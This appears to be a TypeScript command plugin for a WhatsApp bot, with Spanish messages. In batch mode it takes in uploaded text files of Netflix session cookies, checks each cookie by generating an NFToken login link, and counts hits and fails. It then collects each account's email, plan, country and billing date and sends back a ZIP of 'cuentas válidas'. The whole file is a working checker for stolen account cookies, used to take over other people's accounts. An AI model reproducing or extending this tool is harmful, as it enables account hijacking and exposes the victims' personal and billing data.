import JSZip from 'jszip'
import {
  extractCookiesFromBlock,
  buildCookieString,
  generateToken,
  getMetadata,
  getPlanType,
  getProgressBar,
} from '../../../lib/netflix.js'

const batchSessions = new Map<string, Array<{ [key: string]: string }>>()

function formatResult(cookieStr: string, link: string, meta: any): string {
  let c = `🍪 Netflix Cookie\n`
  c += `-----------------------------------------------------\n`
  c += `${cookieStr}\n`
  c += `-----------------------------------------------------\n`
  c += `🧃 Información\n\n`
  if (meta?.country) c += `🌍 País: ${meta.country}\n`
  if (meta?.plan) c += `💎 Plan: ${meta.plan}\n`
  if (meta?.videoQuality) c += `📺 Calidad: ${meta.videoQuality}\n`
  if (meta?.nextBillingDate) c += `📅 Próximo cobro: ${meta.nextBillingDate}\n`
  if (meta?.memberSince) c += `🗓️ Miembro desde: ${meta.memberSince}\n`
  if (meta?.email) c += `📧 Email: ${meta.email}\n`
  c += `\n-----------------------------------------------------\n`
  c += `🔗 NFToken: ${link}\n`
  c += `-----------------------------------------------------\n`
  return c
}

export default {
  command: ['nfbatch', 'go'],
  description: 'Modo lote: acumula archivos y procesa con /go',
  category: 'tools',
  run: async (sock: any, m: any, { command, prefix }: any) => {
    const chatId: string = m.chat
    const cmd = command?.toLowerCase()

    // Start batch mode
    if (cmd === 'nfbatch') {
      batchSessions.set(chatId, [])
      await sock.sendMessage(m.chat, {
        text: `📥 *MODO BATCH ACTIVADO*\n\nEnvía los archivos *.txt* con cookies.\nCuando termines, usa *${prefix}go* para iniciar.`,
      }, { quoted: m })
      await sock.sendMessage(m.chat, { react: { text: '📂', key: m.key } })
      return
    }

    // Process batch
    if (cmd === 'go') {
      const session = batchSessions.get(chatId)

      if (!session) {
        await sock.sendMessage(m.chat, {
          text: `❌ Primero activa el modo batch con *${prefix}nfbatch*`,
        }, { quoted: m })
        return
      }

      if (!session.length) {
        await sock.sendMessage(m.chat, {
          text: `❌ No hay cookies acumuladas. Sube archivos antes de usar *${prefix}go*`,
        }, { quoted: m })
        return
      }

      const total = session.length
      const statusMsg = await sock.sendMessage(m.chat, {
        text: `🔍 *Iniciando proceso batch...*\nTotal: *${total}* cookies`,
      }, { quoted: m })

      let hits = 0
      let fails = 0
      const validResults: Array<{ cookieStr: string; link: string; meta: any }> = []

      for (let i = 0; i < session.length; i++) {
        if (i % 3 === 0 || i === total - 1) {
          const bar = getProgressBar(i, total)
          await sock.sendMessage(m.chat, {
            text: `⚡ *Verificando...*\n${bar}\nProcesados: ${i}/${total}\n✅ Hits: ${hits} | ❌ Fails: ${fails}`,
            edit: statusMsg.key,
          })
        }

        const cd = session[i]
        const tokenResult = await generateToken(cd)

        if (tokenResult.success && tokenResult.token) {
          hits++
          const meta = await getMetadata(cd)
          validResults.push({
            cookieStr: buildCookieString(cd),
            link: tokenResult.link!,
            meta,
          })
        } else {
          fails++
        }

        if (i % 5 === 0) await new Promise(r => setTimeout(r, 300))
      }

      batchSessions.delete(chatId)

      await sock.sendMessage(m.chat, {
        text: `✅ *PROCESO COMPLETADO*\n\n├ 📊 Total: \`${total}\`\n├ ✨ Hits: \`${hits}\`\n└ 💀 Fails: \`${fails}\``,
        edit: statusMsg.key,
      })

      if (!validResults.length) {
        await sock.sendMessage(m.chat, { text: '💀 No hubo cookies válidas.' }, { quoted: m })
        await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
        return
      }

      const zip = new JSZip()
      validResults.forEach((r, idx) => {
        const plan = getPlanType(r.meta?.plan)
        const country = r.meta?.country || 'XX'
        const filename = `[${plan}] [${country}] [${String(idx + 1).padStart(4, '0')}] Netflix.txt`
        zip.file(filename, formatResult(r.cookieStr, r.link, r.meta))
      })

      const zipBuffer = await zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' })
      const timestamp = new Date().toISOString().replace(/[:.]/g, '').slice(0, 15)

      await sock.sendMessage(m.chat, {
        document: zipBuffer,
        fileName: `Netflix_Batch_${timestamp}.zip`,
        mimetype: 'application/zip',
        caption: `📦 *${hits} cuentas válidas*\nFormato: \`[Plan] [PAIS] [XXXX] Netflix.txt\``,
      }, { quoted: m })

      await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
      return
    }

    // Accumulate files (when in batch mode, any document message adds to session)
    const session = batchSessions.get(chatId)
    if (!session) return

    const msg = m.message
    const hasDocument =
      msg?.documentMessage ||
      msg?.documentWithCaptionMessage?.message?.documentMessage

    if (!hasDocument) return

    await sock.sendMessage(m.chat, { react: { text: '📥', key: m.key } })

    let fileBuffer: Buffer
    try {
      const stream = await sock.downloadMediaMessage(m)
      const chunks: Buffer[] = []
      for await (const chunk of stream) chunks.push(chunk)
      fileBuffer = Buffer.concat(chunks)
    } catch {
      await sock.sendMessage(m.chat, { text: '❌ No pude descargar el archivo.' }, { quoted: m })
      return
    }

    const content = fileBuffer.toString('utf-8')
    const extracted = extractCookiesFromBlock(content)

    if (!extracted.length) {
      await sock.sendMessage(m.chat, {
        text: '⚠️ No se encontraron cookies en ese archivo.',
      }, { quoted: m })
      return
    }

    session.push(...extracted)
    batchSessions.set(chatId, session)

    const docName =
      msg?.documentMessage?.fileName ||
      msg?.documentWithCaptionMessage?.message?.documentMessage?.fileName ||
      'archivo.txt'

    await sock.sendMessage(m.chat, {
      text: `✅ *Archivo añadido*\n\n├ 📁 \`${docName}\`\n├ 📥 Cookies: \`${extracted.length}\`\n└ 💾 Total: \`${session.length}\`\n\n_Envía más archivos o usa *${prefix}go*_`,
    }, { quoted: m })
  },
}
